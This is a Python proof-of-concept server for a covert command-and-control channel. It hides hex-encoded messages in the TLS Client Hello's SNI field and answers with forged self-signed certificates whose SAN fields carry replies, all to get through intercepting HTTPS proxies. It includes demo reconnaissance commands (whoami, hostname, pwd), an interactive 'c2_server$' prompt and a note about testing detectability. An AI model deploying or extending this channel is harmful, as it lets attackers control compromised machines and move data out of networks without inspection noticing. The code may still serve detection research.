# -*- coding: utf-8 -*-

"""
server.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284 / 2 ( /2 because of encoding)
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k] / 2 ( /2 because of encoding)
Server Max Length of SAN record: 

TODO:
    1. Implement Reliable Packetization Protocol
    DONE  - 2. Implment server.py (using x509 SAN fields for smuggling)
    3. Test and investigate how detectable this is as a C2 channel
 
"""

# cryptography imports - warning: compiled C libs lurk here
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# from tlslite.messages import ServerHello, ClientHello, Certificate, ServerKeyExchange, ExtensionType
# from tlslite.constants import CipherSuite, CertificateType, HashAlgorithm, SignatureAlgorithm, GroupName, ECCurveType
from tlslite.x509certchain import X509, X509CertChain

# from tlslite.utils.codec import Parser

# from tlslite.utils import p256
# from tlslite.keyexchange import KeyExchange
from tlslite.utils.keyfactory import parsePEMKey
from tlslite.extensions import SNIExtension
from tlslite.errors import TLSAbruptCloseError

# from tlslite.tlsconnection import TLSConnection
from tlslite.sessioncache import SessionCache

#
# WARN: Forked Version of tlslite.tlsconnection that allows us to Dynamically create TLS Server Hello Messages on the fly
#
from tlsconnection import TLSConnection

import socketserver
import struct

import ipaddress
from datetime import datetime, timedelta
import typing
import random
import string
import threading
import socket
import argparse
import time
import math

import http.server

#
# Globals
#

MAX_SINGLE_MSG_LEN = 255
MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62

# This Mixin is not that exciting since... ALL we are doing is handshaking TLS
class TLSSocketServerMixIn:
    def finish_request(self, sock, *args):
        tlslite_connector = TLSConnection(sock, C2Server.callback)
        if self.handshake(tlslite_connector) == True:
            tlslite_connector.close()


#
# Our C2 Server Class
#
class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.HTTPServer):
    """Our TLS Server... with a few MixIns"""

    def callback(self, sni_object: SNIExtension) -> X509CertChain:
        """The tlslite.tlsconnection module calls this function before responding with a ServerHello"""
        sni = ""
        try:
            sni = sni_object.hostNames[0].decode()
        except:
            pass
        if sni:
            cmd, payload = self.decode_msg(sni)

        else:
            cmd, payload = ("", "")
        print(f" < {payload}")
        do_encode = True
        # TODO: for demo purposes
        response_msg = b""
        if cmd == "DEMO_CMD_1":
            response_msg = "whoami"
        if cmd == "DEMO_CMD_2":
            response_msg = "hostname"
        if cmd == "DEMO_CMD_3":
            response_msg = "pwd"
        if cmd == "ping?":
            response_msg = "PONG!"
        if cmd == "CMD":
            response_msg = "OK"
        if not response_msg:
            # For now, just echo back what was sent in the SNA msg
            do_encode = False
            response_msg = sni
        if not response_msg:
            response_msg = "localhost"
        print(f" > {response_msg}")
        self.KEYSTORE.public.x509 = self.create_message(response_msg.encode(), encode=do_encode)
        self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(encoding=serialization.Encoding.PEM).decode()
        tlslite_cert = X509()
        self.KEYSTORE.public.tlslite = tlslite_cert.parse(self.KEYSTORE.public.pem)

        return X509CertChain([self.KEYSTORE.public.tlslite])

    KEYSTORE = type(
        "keystore",
        (object,),
        dict(
            private=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            public=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            _default_pub=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
        ),
    )
    session_cache = None

    def init(self):
        """Its just easier to name this as such and call explicitly, rather than having to fight the mixins dunder inits.. wouldn't you agree?"""
        self.session_cache = SessionCache()
        self.KEYSTORE.private.x509 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )
        self.KEYSTORE.private.pem = self.KEYSTORE.private.x509.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode()
        self.KEYSTORE.private.tlslite = parsePEMKey(
            self.KEYSTORE.private.pem,
            private=True,
        )
        tlslite_cert = X509()
        self.KEYSTORE._default_pub.x509 = self.create_default_cert("localhost")
        self.KEYSTORE._default_pub.pem = self.KEYSTORE._default_pub.x509.public_bytes(
            encoding=serialization.Encoding.PEM
        ).decode()
        self.KEYSTORE._default_pub.tlslite = tlslite_cert.parse(self.KEYSTORE._default_pub.pem)
        self.KEYSTORE.public.x509 = self.KEYSTORE._default_pub.x509
        self.KEYSTORE.public.pem = self.KEYSTORE._default_pub.pem
        self.KEYSTORE.public.tlslite = self.KEYSTORE._default_pub.tlslite
        # super.__init__(self, *args)

    def handshake(self, tlslite_connector):
        try:
            tlslite_connector.handshakeServer(
                certChain=X509CertChain([self.KEYSTORE._default_pub.tlslite]),
                privateKey=self.KEYSTORE.private.tlslite,
                sessionCache=self.session_cache,
            )
            tlslite_connector.ignoreAbruptClose = True
            return True
        except TLSAbruptCloseError:
            pass
        except Exception as e:
            raise e

    def create_message(self, message: bytes, encode=True) -> x509.Certificate:
        # Based on: https://gist.github.com/bloodearnest/9017111a313777b9cce5
        sni_msg_str = message.decode()
        if encode:
            host, domain, tld = self._get_random_hostname()
            fqdn = domain + "." + tld
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, fqdn)])
            sni_msg_str = self._str_to_hex(message.decode()) + "." + fqdn
        else:
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, sni_msg_str)])
        if len(sni_msg_str) > MAX_SINGLE_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(sni_msg_str)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_SINGLE_MSG_LEN}"
            )
            raise NotImplementedError
        # Our smuggled payload goes into the SAN
        san = x509.SubjectAlternativeName([x509.DNSName(sni_msg_str)])
        # Now ready to create the crafter Certificate...
        basic_contraints = x509.BasicConstraints(ca=True, path_length=0)
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(basic_contraints, False)
            .add_extension(san, False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        # cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
        self.current_cert = cert
        return cert

    def _get_random_seed(self) -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def create_default_cert(self, cn: str) -> x509.Certificate:
        if not cn:
            cn = ".".join(self._get_random_hostname())
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), False)
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        self.default_cert = cert
        return cert

    def _get_random_hostname(self) -> typing.Tuple[str, str, str]:
        tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))
        domain = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 8)))
        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 32)))
        return (host, domain, tld)

    def _str_to_hex(self, message: str) -> str:
        return bytes.hex(message.encode())

    def _hex_to_str(self, message: str) -> str:
        return bytes.fromhex(message.decode()).decode()

    def get_message_from_cert(cert: x509.Certificate) -> str:
        return cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value.get_values_for_type(
            x509.DNSName
        )[0]

    def _get_sni(self, hex_str: str) -> str:
        # 2 + 32 + session_id_len[1 byte] + suites_len[2 bytes]
        # 1 + ciphers_len[2 bytes] {ciphers}
        # comp_len[1 byte] {comps}
        # ext_len[2 bytes]
        # EXT_TYPE[2 bytes]; if type == 00 00 == SNI
        # EXT_LEN[2 bytes]
        # offset = 66 + int()
        #
        hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]  # byte array (well, list but ya know)
        position = 35 + int(hex_array[35], 16)  # fixed tls fields
        position = position + int("".join(hex_array[position : position + 2]), 16) + 2  # ciphers suites
        position = position + int(hex_array[position], 16) + 1  # compression methods
        # extensions_len = int("".join(h[position : position + 2]), 16)
        position = position + 2
        sni = self._find_sni_extension(hex_array[position:])
        return sni

    def _find_sni_extension(self, exts: list) -> str:
        position = 0
        while position < len(exts):
            ext_type = "".join(exts[position : position + 2])
            ext_len = int("".join(exts[position + 2 : position + 4]), 16)
            # print("DEBUG_EXT_len: "+str(ext_len))
            # print("DEBUG_type: "+ext_type)
            if ext_type == "0000":
                position = position + 7
                # print("DEBUG_position: "+str(position))
                sni_len = int("".join(exts[position : position + 2]), 16)
                position = position + 2
                # print("DEBUG_sni_len: "+str(sni_len))
                # print("DEBUG_sni!: "+str(''.join(exts[position:position+sni_len])))
                return bytes.fromhex("".join(exts[position : position + sni_len])).decode()
            else:
                position = position + ext_len + 4
            return ""

    def _validate_client_hello(self, hex_str: str) -> bool:
        # TLS client hello HEADER Ex: "16 0301 00d3 01 000024"
        try:
            if hex_str[0:2] != "16":
                return False
            if hex_str[2:4] != "03":
                return False
            if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
                return False
            max_len = int(math.pow(2, 14))
            if (int(hex_str[6:10], 16) < 1) or (int(hex_str[6:10], 16) > max_len):
                return False
            if hex_str[10:12] != "01":
                return False
            if (int(hex_str[12:], 16) < 1) or (int(hex_str[12:], 16) > max_len):
                return False
        except:
            return False
        return True

    def decode_msg(self, msg: str) -> typing.Tuple[str, str]:
        """Extracts the smuggled SNI message from the Client Hello"""
        # TODO: For the momement, only handles string types, not arbitrary byte payloads - Fix this up
        payload = ""
        cmd = ""
        try:
            payload = bytes.fromhex(msg.split(".")[0]).decode()
            cmd = payload.split(" ")[0]
        except:
            payload = msg.split(".")[0]
            cmd = ""
        return (cmd, payload)


# end class C2Server()

if __name__ == "__main__":
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # proxy_send("_HOST_",443)

    # is_connected = proxy_connect
    # send_raw.proxy_connect(socket.socket(socket.AF_INET, socket.SOCK_STREAM),'_HOST_')

    # new shiz
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument(
        "-p",
        "--port",
        metavar="bind_port",
        required=False,
        help="Bind to Listening TCP Port number",
    )
    args = arg_parse.parse_args()
    port = 8443
    if args.port:
        port = int(args.port)
    server = None
    # try:
    #     thread = ThreadedServer("", port)
    #     thread.daemon = True
    #     thread.listen()
    #     while True:
    #         time.sleep(100)
    # except KeyboardInterrupt:
    #     exit(0)
    # TCPServerInstance = socketserver.ThreadingTCPServer(("0.0.0.0", int(port)), ThreadedTCPSocketServer)
    C2Server = TLSServer(("0.0.0.0", port), None)
    C2Server.init()
    C2Server.allow_reuse_address = True
    C2Server.allow_reuse_port = True
    server_thread = threading.Thread(target=C2Server.serve_forever,daemon=True)
    print(f"[+] Listening on 0.0.0.0:{port}")
    print("Type 'exit' to terminate the process.")
    try:
        server_thread.start()
        while True:
            # get input from console
            cmd = input("c2_server$ ")
            if cmd == "exit":
                break
        raise KeyboardInterrupt
    except KeyboardInterrupt:
        C2Server.shutdown()
        C2Server.server_close()
        server_thread.join()
        print("[+] Exiting.")
        exit(0)
